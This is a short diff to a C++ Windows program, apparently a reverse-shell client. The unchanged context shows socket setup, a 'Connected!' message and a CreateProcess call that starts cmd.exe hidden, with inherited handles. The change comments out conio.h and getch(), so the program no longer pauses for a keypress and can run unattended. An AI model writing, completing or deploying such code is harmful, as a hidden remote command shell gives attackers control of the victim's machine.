@@ -5,7 +5,7 @@
 #include <string>
 #include <dirent.h>
 #include <sys/stat.h>
-#include <conio.h>
+// #include <conio.h>
 #pragma comment(lib, "w2_32")
 
 WSADATA wsaData;
@@ -75,7 +75,7 @@ int main(int argc, char* argv[]) {
   }
   std::cout << "[+} Connected!\n";
   CreateProcess(NULL, (LPSTR)"C:\\windows\\system32\\cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sui, &pi);
-  getch();
+  // getch();
   return 0;
 }
 
